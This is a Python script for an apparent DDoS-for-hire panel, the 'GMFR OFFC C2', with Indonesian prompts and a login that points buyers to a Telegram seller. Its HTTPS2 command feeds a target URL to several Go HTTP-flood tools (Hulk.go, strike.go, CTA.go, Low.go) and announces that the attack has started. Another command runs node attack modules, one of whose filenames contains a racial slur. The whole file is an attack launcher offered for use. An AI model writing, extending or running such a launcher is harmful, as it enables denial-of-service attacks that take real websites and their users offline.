# FIXXED BY @GMFR
from operator import index
import socket
import os
import requests
import random
import getpass
import time
import sys
from colorama import Fore, Back
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
import codecs
import string
import urllib
import getpass

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
HALLO WELCOME TO GMFR PANEL''')
    time.sleep(0.6)
    clear()
    print(f'''
MOHON TUNGGU SEBENTAR...''')
    time.sleep(0.6)
    clear()
    print(f'''
LOADING⏳''')
    time.sleep(0.6)
    clear()
    print(f"""
SUCCES✅""")
    time.sleep(0.8)
    clear()

def si():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mGMFR OFFC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to GMFR TEAM DDOS \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: GMFR OFFC C2 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.3')
    print("")

def L7():
	print("""                              

\033[1;49;31m [ LAYER 7 ]
\033[1;49;31m NOTE USE:
 METHODE  [URL]
 CONTOH :
\033[37m METHOD : GET/POST

\033[37m
 – HTTPS2 [url] 
    
    TIME SUDAH DI SETTING
 
 
""")

def MENU():
    sys.stdout.write(f"         \x1b]2;GMFR OFFC C2 --> Stars: [{bots}] | Online Users: [500] | Methods: [35] | Bypass: [29] | Amps: [14]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mGMFR OFFC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to GMFR OFFC C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: @GMFR \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.3')
    print("")
    print("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
welcome


\x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " MENU " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
""")

def main():
    MENU()
    while(True):
        cnc = input("root@gmfrPannel:~# \x1b[1;37m\033[0m ")
        if cnc == "L7" or cnc == "l4":
            L7()

# LAYER 7 METHODS

        elif "HTTPS2" in cnc:
            try:
                url = cnc.split()[1]
         
                os.system(f'cd godzilla && screen -dm go run Hulk.go -site {url} -data GET')
                os.system(f'cd godzilla && screen -dm go run strike.go -url [url] -method GET')
                os.system(f'cd godzilla && screen -dm go run CTA.go -site {url} -data GET')
                os.system(f'cd godzilla && screen -dm go run Low.go -site {url} -data GET')
                clear()

                print(f'''

 \033[1;49;31m                           ╔═══╦═══╦═══╦\033[37m═╗╔═╦═══╦═╗─╔╗
\033[1;49;31m                           ║╔═╗║╔═╗║╔═╗║\033[37m║╚╝║║╔═╗║║╚╗║║
\033[1;49;31m                           ║╚═╝║║─║║║─╚╣\033[37m╔╗╔╗║║─║║╔╗╚╝║
\033[1;49;31m                           ║╔══╣╚═╝║║─╔╣\033[37m║║║║║╚═╝║║╚╗║║
\033[1;49;31m                           ║║──║╔═╗║╚═╝║\033[37m║║║║║╔═╗║║─║║║
\033[1;49;31m                           ╚╝──╚╝─╚╩═══╩\033[37m╝╚╝╚╩╝─╚╩╝─╚═╝
\033[37m                             ATTACK HAS BEEN STARTED!
\033[1;49;31m                 ╚╦════════════════════════════════════════════╦╝
\033[1;49;31m            ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;49;31m                   TARGET   : \033[1;37m[ \033[1;37m{url} \033[1;37m]
\033[1;49;31m                   TIME     : \033[1;37m[ \033[1;37m120 \033[1;37m]
\033[1;49;31m                   PORT     : \033[1;37m[ \033[1;37m443 \033[1;37m]
\033[1;49;31m                   LAYER-7  : \033[1;37m[ \033[1;37mHTTPS-PACMAN \033[1;37m]
\033[1;49;31m                   VIP      : \033[1;37m[ \033[32mTrue \033[1;37m]
 \033[1;49;31m                  USER     : \033[1;37m[ \033[1;37mGMFR \033[1;37m]
\033[1;49;31m            ╚════════════════════════════════════════════════════════╝

\033[37m UNTUK STOP SERANGAN CTRL+C LALU ENTER PADA TERMINAL KALIAN
\033[37m AGAR HP TIDAK NGELAG AOWKAOWK

''')
            except IndexError:
                print('Usage: HTTPS2 <url> <method>')
                print('Example: HTTPS2 https://example.com GET')
                
                
                

        elif "MODULES-UPDATE" in cnc:
            try:
                os.system(f'cd godzilla && node node_auto_install_modules.js HTTP-NIGGA.js 404.js anus.js MIX.js BYPASS.js')
            except IndexError:
                print('Usage: MODULES-UPDATE')
                print('Example: MODULES-UPDATE')	    

        elif "MENU" in cnc:
            print(f'''
L7 -> LAYER 7
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    os.system("clear")
    user = ""
    passwd = ""
    username = input("""





    
                
                           ⚡ \33[0;32mLOGIN TO DDOS : """)
    password = getpass.getpass(prompt="""                  
                           ⚡ \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""        
                              ☠️ \033[1;31;40mBUY YA DEKS t.me/ZOXC_OFC""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                         ⚡ \33[0;32mWELLCOME TO DDOS""")
        time.sleep(0.3)
    MENU()
    main()
    

login()